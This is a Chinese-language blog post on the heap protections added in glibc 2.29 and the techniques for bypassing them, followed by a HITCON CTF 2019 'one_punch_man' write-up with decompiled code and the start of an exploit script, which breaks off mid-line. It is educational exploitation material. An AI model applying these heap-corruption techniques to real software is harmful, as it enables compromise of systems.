<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Sivona">





<title>论如何在glibc2.29下生存 | Sivona&#39;s</title>



    <link rel="icon" href="/bug.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    




<meta name="generator" content="Hexo 4.2.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Sivona&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Sivona&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">论如何在glibc2.29下生存</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Sivona</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">June 9, 2020&nbsp;&nbsp;21:37:20</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/heap/">heap</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="新增保护机制"><a href="#新增保护机制" class="headerlink" title="新增保护机制"></a>新增保护机制</h2><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><p>tcache_entry结构体新增了一个指针key存放在chunk的bk处，tache_put写入，tcache_get清空</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在free一个tcache时，新增一个判断分支：如果bk==key则会遍历tcache检查是否有相同的chunk</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don't abort.  */</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>如何绕过呢？？</p>
<ul>
<li><p>修改bk使不进入循环分支</p>
</li>
<li><p>修改size从而修改tc_idx</p>
</li>
<li><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_botcake.c" target="_blank" rel="noopener">house of botcake</a>：合并chunk1 chunk2进unsortedbins，将chunk2链进tcache，从chunk1分配一个大chunk造成overlapped到chunk2修改其fd</p>
</li>
<li><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/fastbin_reverse_into_tcache.c" target="_blank" rel="noopener">fastbin_reverse_into_tcache</a></p>
</li>
</ul>
<h3 id="unsortedbins"><a href="#unsortedbins" class="headerlink" title="unsortedbins"></a>unsortedbins</h3><p>新增检查</p>
<ul>
<li><p>size是否合理</p>
</li>
<li><p>next chunk的prev_size是否等于victim的size</p>
</li>
<li><p>双向链表完整性检查</p>
</li>
<li><p>next chunk的prev_inuse位是否为0</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): invalid size (unsorted)"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): mismatching next-&gt;prev_size (unsorted)"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): unsorted double linked list corrupted"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): invalid next-&gt;prev_inuse (unsorted)"</span>);</span><br></pre></td></tr></table></figure>





<h3 id="malloc-overlap"><a href="#malloc-overlap" class="headerlink" title="malloc overlap"></a>malloc overlap</h3><p>当向后合并（低地址）时，会检查上个chunk的size和当前chunk的prev_size是否相等</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>以下假设有off by null漏洞👇</p>
<p>在之前的glibc版本中还存在双向链表检查，我们一般是通过将要合并的chunk放入unsortedbins中获得系统给的fd和bk来绕过以达到chunk overlapping的目的。但是2.29的新机制无法通过这个方式绕过双向链表检查。</p>
<p>如何绕过呢？？？</p>
<p>主要思路是利用从largebin中分配的残留指针 fd_nextsize / bk_nextsize，因为largebin中只有一个chunk时，这两个指针指向自己，先通过部分覆盖修改fb_nextsize的第一个字节，使其指向一个我们可以控制bk的chunk，例如利用smallbins或unsortedbins的机制部分覆盖bk指向fake_chunk。这时bk_nextsize仍然指向自己。利用同样的思路将其链入fastbins中部分覆盖第一个字节使其指向fake_chunk。这样双向链表就构造好了</p>
<p>总结一下就是利用smallbins会在bk写入堆地址，fastbins会在fd写入堆地址，然后部分覆盖构造双向链表。但是我们无法保证堆地址第二个字节是\x00，所以这种攻击方式有6.25%的概率会成功:]</p>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): corrupted top size"</span>);</span><br></pre></td></tr></table></figure>
<p>GG</p>
<h2 id="Hitcon-CTF2019-one-punch-man"><a href="#Hitcon-CTF2019-one-punch-man" class="headerlink" title="Hitcon-CTF2019-one_punch_man"></a>Hitcon-CTF2019-one_punch_man</h2><p>保护全开</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>程序有5个功能:</p>
<p>add</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">Add</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-418h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> name_len; <span class="comment">// [rsp+Ch] [rbp-414h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+10h] [rbp-410h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+418h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  MyPuts(<span class="string">"idx: "</span>);</span><br><span class="line">  idx = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">2</span> )</span><br><span class="line">    error((__int64)<span class="string">"invalid"</span>);</span><br><span class="line">  MyPuts(<span class="string">"hero name: "</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">1024u</span>LL);</span><br><span class="line">  name_len = read(<span class="number">0</span>, s, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( name_len &lt;= <span class="number">0</span> )</span><br><span class="line">    error((__int64)<span class="string">"io"</span>);</span><br><span class="line">  s[name_len - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( name_len &lt;= <span class="number">0x7F</span> || name_len &gt; <span class="number">0x400</span> )</span><br><span class="line">    error((__int64)<span class="string">"poor hero name"</span>);</span><br><span class="line">  *((_QWORD *)&amp;unk_4040 + <span class="number">2</span> * idx) = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, name_len);</span><br><span class="line">  qword_4048[<span class="number">2</span> * idx] = name_len;</span><br><span class="line">  <span class="built_in">strncpy</span>(*((<span class="keyword">char</span> **)&amp;unk_4040 + <span class="number">2</span> * idx), s, name_len);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个函数里允许我们分配0x80-0x400大小的chunk，并把初始化chunk的内容先保存在栈上再通过strncpy传送到堆里，rebase(0x4040)会依次保存chunk地址和大小且只能同时分配三个。注意这里分配chunk使用的是calloc，即不会从tcache中取chunk。</p>
<p>free</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">Delete</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  MyPuts(<span class="string">"idx: "</span>);</span><br><span class="line">  v2 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">2</span> )</span><br><span class="line">    error((__int64)<span class="string">"invalid"</span>);</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_4040 + <span class="number">2</span> * v2));         <span class="comment">// uaf</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里没有对指针清空，存在uaf</p>
<p>backdoor</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">Magic</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(qword_4030 + <span class="number">0x20</span>) &lt;= <span class="number">6</span> )</span><br><span class="line">    error((__int64)<span class="string">"gg"</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x217</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    error((__int64)<span class="string">"err"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x217</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    error((__int64)<span class="string">"io"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Serious Punch!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_2128);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序留了一个后门函数可以调用malloc，限制了利用条件 <strong>*(heap_base+0x30) &gt; 6</strong></p>
<p>edit</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">rename</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  MyPuts(<span class="string">"idx: "</span>);</span><br><span class="line">  v3 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    error((__int64)<span class="string">"invalid"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;unk_4040 + <span class="number">2</span> * v3) )</span><br><span class="line">    error((__int64)<span class="string">"err"</span>);</span><br><span class="line">  MyPuts(<span class="string">"hero name: "</span>);</span><br><span class="line">  result = read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;unk_4040 + <span class="number">2</span> * v3), qword_4048[<span class="number">2</span> * v3]);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">0</span> )</span><br><span class="line">    error((__int64)<span class="string">"io"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">Show</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  MyPuts(<span class="string">"idx: "</span>);</span><br><span class="line">  v3 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    error((__int64)<span class="string">"invalid"</span>);</span><br><span class="line">  result = *((_QWORD *)&amp;unk_4040 + <span class="number">2</span> * v3);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    MyPuts(<span class="string">"hero name: "</span>);</span><br><span class="line">    result = <span class="built_in">puts</span>(*((<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;unk_4040 + <span class="number">2</span> * v3));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为存在uaf，所以我们可以很容易地leak出堆地址和libc地址，同时存在edit函数可以修改tcache的fd，只要可以调用程序留给我们的后门函数中的malloc就可以实现任意地址写</p>
<p>那么如何将heap_base+0x30处的值修改为一个large value呢</p>
<p>这里就要用到glibc2.29下的一种利用手法tcache_stashing_unlink_attack</p>
<p>先贴主要用到的glibc源码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>因为我们无法像<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_stashing_unlink_attack.c" target="_blank" rel="noopener">how2heap</a>中修改fake_chunk-&gt;fd为一个可写的地址，所以我们只在tcache中预留一个位置</p>
<p>那么如何使得smallbins存在两个chunk并且相应大小的tcache未满呢？？</p>
<p>这里用到一个技巧，通过分配并释放一个较大的chunk，然后利用分割机制拿到我们想要的size</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">"aaaa"</span>,<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"tcache"</span>,<span class="number">0x210</span>)</span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#fill tcache done</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"bbbb"</span>,<span class="number">0x210</span>)</span><br><span class="line">·</span><br><span class="line">·</span><br><span class="line">·</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"cccc"</span>,<span class="number">0x180</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span 